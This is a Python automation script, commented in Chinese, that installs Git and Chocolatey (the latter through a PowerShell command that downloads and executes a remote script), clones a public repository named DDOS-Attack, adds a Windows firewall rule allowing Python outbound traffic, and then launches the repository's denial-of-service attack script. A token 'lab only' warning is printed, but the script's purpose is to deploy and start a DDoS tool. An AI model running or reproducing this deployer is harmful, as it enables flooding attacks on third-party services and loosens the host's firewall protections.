import subprocess
import sys
import os

def run_cmd(command, shell=True):
    """运行命令并实时输出"""
    print(f"[CMD] {command}")
    process = subprocess.Popen(command, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in process.stdout:
        print(line, end='')
    process.wait()
    return process.returncode

def main():
    print("=" * 60)
    print("  DDOS-Attack 自动部署脚本 (Python)")
    print("  警告：仅限在隔离实验室环境中使用！")
    print("=" * 60)
    input("按 Enter 继续，或 Ctrl+C 退出...")

    # 1. 检查 Python 版本
    print("[*] 检查 Python 版本...")
    if sys.version_info < (3, 6):
        print("[!] 需要 Python 3.6 或更高版本。")
        sys.exit(1)
    print(f"[*] Python {sys.version} 已就绪。")

    # 2. 安装 Git (如果未安装)
    print("[*] 尝试安装 Git...")
    run_cmd("winget install Git.Git --accept-source-agreements --accept-package-agreements")

    # 3. 安装 Chocolatey (如果未安装)
    print("[*] 安装 Chocolatey 包管理器...")
    run_cmd('powershell -NoProfile -ExecutionPolicy Bypass -Command "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\'https://community.chocolatey.org/install.ps1\'))"')

    # 4. 安装 figlet
    print("[*] 安装 figlet...")
    run_cmd("choco install figlet -y")

    # 5. 克隆仓库
    print("[*] 克隆 DDOS-Attack 仓库...")
    if not os.path.exists("DDOS-Attack"):
        run_cmd("git clone https://github.com/BC-809/DDOS-Attack.git")
    else:
        print("[*] 目录已存在，跳过克隆。")
    os.chdir("DDOS-Attack")

    # 6. 添加防火墙规则
    print("[*] 添加防火墙出站规则...")
    python_exe = sys.executable
    run_cmd(f'netsh advfirewall firewall add rule name="Python DDoS Test" dir=out action=allow program="{python_exe}" enable=yes')

    # 7. 运行攻击脚本
    print("\n" + "=" * 60)
    print("  部署完成，即将启动 DDOS-Attack 脚本...")
    print("=" * 60)
    run_cmd("python DDOS/English/DDOS-Attack_01_e.py")

if __name__ == "__main__":
    main()
